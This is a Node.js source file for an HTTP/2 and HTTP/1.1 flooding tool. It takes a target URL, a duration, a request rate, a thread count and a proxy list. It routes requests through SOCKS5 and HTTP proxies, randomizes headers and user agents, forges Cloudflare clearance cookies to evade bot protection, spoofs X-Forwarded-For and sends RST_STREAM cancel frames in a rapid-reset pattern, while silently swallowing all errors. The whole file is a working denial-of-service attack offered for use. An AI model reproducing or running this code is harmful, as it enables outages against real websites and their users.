const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const dataSize = 500 * 1024 * 1024; // 500MB
const fileData = Buffer.alloc(dataSize);
const HTTP2_FRAME_SIZE = 9;
const FRAME_TYPE_SETTINGS = 0x4;
const FRAME_TYPE_HEADERS = 0x1;
const FRAME_TYPE_RST_STREAM = 0x3;
const FLAGS_NONE = 0x0;
const STREAM_ID_ZERO = 0x0;
const STREAM_ID = 1;
const RST_STREAM_CANCEL = 0x8;
const FRAME_TYPE_WINDOW_UPDATE = 0x8;
const FLAGS_END_STREAM = 0x1; // End of stream flag
const FLAGS_END_HEADERS = 0x4; // End of headers flag
const FLAGS_PADDED = 0x8; // Padded flag
const FLAGS_PRIORITY = 0x20; // Priority flag
const FLAGS_RESERVED = 0x7E; // Reserved flagco

const errorHandler = error => {
	console.log(error);
}



function createWindowUpdateFrame(streamId, windowSize) {
    const length = Buffer.alloc(3);
    length.writeUIntBE(4, 0, 3);
    const type = Buffer.alloc(1, FRAME_TYPE_WINDOW_UPDATE);
    const flags = Buffer.alloc(1, FLAGS_NONE);
    const streamIdBuffer = Buffer.alloc(4);
    streamIdBuffer.writeUInt32BE(streamId & 0x7FFFFFFF);
    const windowSizeBuffer = Buffer.alloc(4);
    windowSizeBuffer.writeUInt32BE(windowSize, 0);

    return Buffer.concat([length, type, flags, streamIdBuffer, windowSizeBuffer]);
}



const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  ],

  cache_header = [
    'max-age=0',
    'no-cache',
    'no-store', 
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
  ]



language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
  ];
  const fetch_site = [
    "same-origin"
    , "same-site"
    , "cross-site"
    , "none"
  ];
  const fetch_mode = [
    "navigate"
    , "same-origin"
    , "no-cors"
    , "cors"
  , ];
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}
  const fetch_dest = [
    "document"
    , "sharedworker"
    , "subresource"
    , "unknown"
    , "worker", ];
    const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
  const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
  const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 8){console.log(`Usage: host time req thread proxy.txt `); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
      protocol: process.argv[7] // New argument for protocol choice (http1 or http2)
 }
 

 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
 
     async SOCKS5(options, callback) {

      const address = options.address.split(':');
      socks.createConnection({
        proxy: {
          host: options.host,
          port: options.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: address[0],
          port: +address[1]
        }
      }, (error, info) => {
        if (error) {
          return callback(undefined, error);
        } else {
          return callback(info.socket, undefined);
        }
      });
     }
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}


 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

 if (cluster.isMaster) {
    console.clear()
    console.log(`Note: Only work on http/2 or http/1.1 `.brightCyan)
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
	setInterval(runFlooder,1)
}
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    const rateHeaders1 = [
      {"vtl": "s-maxage=9800" },
      {"X-Forwarded-For": parsedProxy[0] },
      {"Accept-Transfer": "gzip" },
      {"Virtual.machine": "Encode" },
      {"source-ip" : randstr(5)},
      ];
      const rateHeaders2 = [
      { "TTL-3": "1.5" },
      ];
      const rateHeaders3 = [
      { "cache-control": cache_header[Math.floor(Math.floor(Math.random() * cache_header.length))]},
      { "A-IM": "Feed" },
      ];
      const rateHeaders4 = [
      {"Service-Worker-Navigation-Preload" : "true"},
      {"Supports-Loading-Mode" : "credentialed-prerender"},
      {"Alt-Used" : parsedTarget.host},
      { "pragma": "no-cache" },
      {"Geos-Location": "UNKNOWN" },
      {"Sec-Fetch-Dest": fetch_dest[Math.floor(Math.floor(Math.random() * fetch_dest.length))]},
      {"Sec-Fetch-Mode":fetch_mode[Math.floor(Math.floor(Math.random() * fetch_mode.length))]},
      {"Sec-Fetch-Site": fetch_site[Math.floor(Math.floor(Math.random() * fetch_site.length))]},
      { "X-Content-type": "text/html" },
      ];
      
          const rhd = [
            {'RTT': Math.floor(Math.random() * (400 - 600 + 1)) + 100},
            {'Nel': '{ "report_to": "name_of_reporting_group", "max_age": 12345, "include_subdomains": false, "success_fraction": 0.0, "failure_fraction": 1.0 }'},
            {"sec-ch-ua-bitness" : "64"},
          //	{ "referer": "https://" + parsedTarget.host + "?cf_chl_tk=" + generateRandomString(15,20)  },
          ]
          const hd1 = [
            {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
            {'Delta-Base' : '12340001'},
             {"te": "trailers"},
             { "sec-ch-ua-arch" : "x86"},
            // {"accept-language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3"}
          ]
   function randstra(length) {
            const characters = "0123456789";
            let result = "";
            const charactersLength = characters.length;
            for (let i = 0; i < length; i++) {
              result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }
            return result;
          }
          const operatingSystems = ["Windows NT 10.0", "Macintosh", "X11", "Windows NT 11.0", "Windows 10 version 1507",];
          const architectures = {
            "Windows NT 10.0": `${Math.random() < 0.5 ? `Win64; x64; rv:10${randstra(1)}.0` : `Win64; x64; rv:10${randstra(3)}.0`}`,
            "Windows NT 11.0": `${Math.random() < 0.5 ? `WOW64; Trident/${randstra(2)}.${randstra(1)}; rv:10${randstra(1)}.0` : `Win64; x64; rv:10${randstra(2)}.0`}`,
            "Windows 10 version 1507":`${Math.random() < 0.5 ? `Win64; x64; rv:10${randstra(1)}.0` : `Win64; x64; rv:10${randstra(3)}.0`}`,
            "Macintosh": `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}`,
            "X11": `${Math.random() < 0.5 ? `Linux x86_64; rv:10${randstra(3)}.0` : `Linux x86_64; rv:10${randstra(5)}.0`}`
          };
          const browsers = [
            "Chrome/116.0.0.0 Safari/537.36 Edg/116",
            "Chrome/115.0.0.0 Safari/537.36 Edg/115",
            "Chrome/114.0.0.0 Safari/537.36 Edg/114",
            "Chrome/113.0.0.0 Safari/537.36 Edg/113",
            "Chrome/123.0.0.0 Safari/537.36",
            "Chrome/112.0.0.0 Safari/537.36 Edg/112",
            "Chrome/111.0.0.0 Safari/537.36 Edg/111",
            "Chrome/110.0.0.0 Safari/537.36 Edg/110",
            "Chrome/116.0.0.0 Safari/537.36 Vivaldi/116",
            "Chrome/115.0.0.0 Safari/537.36 Vivaldi/115",
            "Chrome/114.0.0.0 Safari/537.36 Vivaldi/114",
            "Chrome/113.0.0.0 Safari/537.36 Vivaldi/113",
            "Chrome/112.0.0.0 Safari/537.36 Vivaldi/112",
            "Chrome/111.0.0.0 Safari/537.36 Vivaldi/111",
            "Chrome/110.0.0.0 Safari/537.36 Vivaldi/110",
            "Chrome/116.0.0.0 Safari/537.36 OPR/102",
            "Chrome/100.0.4896.127 Safari/537.36",
            "Chrome/117.0.0.0 Safari/537.36"
          ];
          const skid = [
            "10005465237",
            "8851064634",
            "89313646253",
            "2206423942",
            "12635495631"
          ];
          const lol = skid[Math.floor(Math.random() * skid.length)];
          
          function getRandomValue(arr) {
            return arr[Math.floor(Math.random() * arr.length)];
          }
          
          const randomOS = getRandomValue(operatingSystems);
          const randomArch = architectures[randomOS]; 
          const randomBrowser = getRandomValue(browsers);
          const uap =`Mozilla/5.0 (${randomOS}; ${lol}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}`;       
let headers = {
":method":"GET",
  ":authority": parsedTarget.host,
  ":scheme": "https",
  ":path": parsedTarget.path + "?" +randstr(1) + "=" + "%RAND%",
  "upgrade-insecure-requests" : "1",
  "dnt" : 1,
}

const proxyOptions = {
     host: parsedProxy[0],
     port: ~~parsedProxy[1],
     ciphers: cipper,
     address: parsedTarget.host + ":443",
     timeout: 10
 };
  if (args.protocol === "http1") {
    const client = http;
    for (let i = 0; i < args.Rate; i++) {
        const options = {
            hostname: parsedTarget.host,
            port: 80,
            path: parsedTarget.path,
            method: 'GET',
            headers: {
                'User-Agent': uap // Add the user-agent header
            }
        };

        const req = client.request(options, (res) => {
            // Handle response if needed
            res.on('data', (chunk) => {
                // Handle data if needed
            });
        });

        req.on('error', (error) => {
            // Handle request error if needed
        });

        req.end();
    }
}

 Socker.SOCKS5(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    const settings = {
       initialWindowSize: 6291456,
   };
   function getFlags(type, flagsByte) {
    let flagsStr = '';

    switch (type) {
        case 'DATA':
            if (flagsByte & FLAGS_END_STREAM) flagsStr += 'END_STREAM ';
            if (flagsByte & FLAGS_PADDED) flagsStr += 'PADDED ';
            break;
        case 'HEADERS':
            if (flagsByte & FLAGS_END_STREAM) flagsStr += 'END_STREAM ';
            if (flagsByte & FLAGS_END_HEADERS) flagsStr += 'END_HEADERS ';
            if (flagsByte & FLAGS_PADDED) flagsStr += 'PADDED ';
            if (flagsByte & FLAGS_PRIORITY) flagsStr += 'PRIORITY ';
            break;
        case 'PRIORITY':
            // Flags field in PRIORITY frame is always 0, no need to handle.
            break;
        case 'RST_STREAM':
            // No flags in RST_STREAM frame, always return 'NONE'.
            flagsStr = 'NONE';
            break;
        case 'SETTINGS':
            // No flags in SETTINGS frame, always return 'NONE'.
            flagsStr = 'NONE';
            break;
        case 'PUSH_PROMISE':
            if (flagsByte & FLAGS_END_HEADERS) flagsStr += 'END_HEADERS ';
            if (flagsByte & FLAGS_PADDED) flagsStr += 'PADDED ';
            if (flagsByte & FLAGS_RESERVED) flagsStr += 'RESERVED ';
            break;
        case 'PING':
            // No flags in PING frame, always return 'NONE'.
            flagsStr = 'NONE';
            break;
        case 'GOAWAY':
            // No flags in GOAWAY frame, always return 'NONE'.
            flagsStr = 'NONE';
            break;
        case 'WINDOW_UPDATE':
            // No flags in WINDOW_UPDATE frame, always return 'NONE'.
            flagsStr = 'NONE';
            break;
        case 'CONTINUATION':
            if (flagsByte & FLAGS_END_HEADERS) flagsStr += 'END_HEADERS ';
            break;
        default:
            flagsStr = 'UNKNOWN';
    }

    return flagsStr.trim();
}

let STREAM_ID_DYNAMIC = 1;
   const tlsOptions = {
       port: parsedPort,
       secure: true,
       ALPNProtocols: [
       "h2",
       "http/1.1",
       ],
       ciphers: cipper,
       sigalgs: sigalgs,
       requestCert: true,
       socket: connection,
       ecdhCurve: ecdhCurve,
       honorCipherOrder: false,
       rejectUnauthorized: false,
       secureOptions: secureOptions,
       secureContext :secureContext,
       host : parsedTarget.host,
       servername: parsedTarget.host,
       secureProtocol: secureProtocol
   };
   const tlsSocket = tls.connect(parsedPort, parsedTarget.host, {
    ...tlsOptions

});
tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
   tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);
    if (args.protocol === "http2") {
     const client = await http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsSocket,
        settings: {
          headerTableSize: 65536,
            maxConcurrentStreams: 128,
            initialWindowSize: 6291456 * 10,
            maxHeaderListSize: 262144 * 10,
            maxFrameSize : 16384,
            enablePush: false
        },
        socket: connection,
    });
    const codec = new HPACK();
    client.setMaxListeners(0);
    const windowUpdateFrame = createWindowUpdateFrame(STREAM_ID_ZERO, 15663105);
client.settings(windowUpdateFrame);

client.on("connect", async () => {
  let STREAM_ID_DYNAMIC = 1;

  setInterval(async () => {
    const shuffleObject = (obj) => Object.fromEntries(Object.entries(obj).sort(() => Math.random() - 0.5));
    const randomItem = (array) => array[Math.floor(Math.random() * array.length)];

    let dynHeaders = shuffleObject({
      "user-agent": uap,
      ...(Math.random() < 0.5 && { rhd: [randomItem(rhd)] }),
      ...(Math.random() < 0.5 && { hd1: [randomItem(hd1)] }),
      ...headers,
      ...randomItem(rateHeaders1),
      ...randomItem(rateHeaders2),
      ...randomItem(rateHeaders3),
      "Cookie": `__cf_bm=${randstr(23)}_${randstr(19)}-${Date.now()}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${Date.now()}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${Date.now()}`,
      ...randomItem(rateHeaders4),
      ...(Math.random() < 0.5 ? { ['PLASMA' + randstr(3)]: "document" + generateRandomString(1, 3) } : {}),
    });
    function logFrame(frameBuffer, type, streamId) {
      const length = frameBuffer.length - HTTP2_FRAME_SIZE;
      const flags = getFlags(type, frameBuffer); 
      console.log(`[frame] ${type} > ${flags} stream: ${streamId} [${length}]`);
    }

    function createHeadersFrame(chunk, streamId, dynHeaders) {
      const packedHeaders = codec.encode(dynHeaders);
      const length = packedHeaders.length;
      const type = FRAME_TYPE_HEADERS;
      const flags = FLAGS_END_HEADERS;
      const header = Buffer.alloc(HTTP2_FRAME_SIZE);

      header.writeUInt32BE((length << 8) | type, 0);
      header.writeUInt8(flags, 4);
      header.writeUInt32BE(streamId, 5);

      logFrame(header, 'HEADERS', streamId);

      return Buffer.concat([header, packedHeaders, chunk]);
    }

    for (let i = 0; i < args.Rate; i++) {
      const request = await client.request(dynHeaders).on("response", (dynHeaders, flags)  => {
        request.on('data', (chunk, flags) => {
          const flagsByte = flags & 0xFF;
          const flagsDescription = getFlags('CONTINUATION', flagsByte);
          if (flagsByte & FLAGS_END_HEADERS) {
          }
        });
        request.write(fileData);
        request.connection.prependListener('socket', (socket) => {
          socket.prependListener('data', (chunk) => {
            const modifiedChunk = createHeadersFrame(chunk, STREAM_ID_DYNAMIC, dynHeaders);
            socket.write(modifiedChunk)
            .on('end', () => {
            const rstStreamFrame = Buffer.alloc(13);
            rstStreamFrame.writeUInt8(FRAME_TYPE_RST_STREAM, 0); // Frame type: RST_STREAM (3)
            rstStreamFrame.writeUInt32BE(request.stream.id, 5); // Stream ID
            rstStreamFrame.writeUInt32BE(RST_STREAM_CANCEL, 9); // Error code: CANCEL (8)
                    
            // Send RST_STREAM frame to the server
            client._session._socket.write(rstStreamFrame);
            });
          });
        });
        request.close();
        request.destroy();
        return;
      });
      request.end(undefined, { endStream: true });
    };
  },300);
});
}
STREAM_ID_DYNAMIC += 2;
    client.on("close", () => {
        client.destroy();
        tlsSocket.destroy();
        connection.destroy();
        return;
    });

    client.on("error", error => {
        client.destroy();
        connection.destroy();
        return;
    });
});
};
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

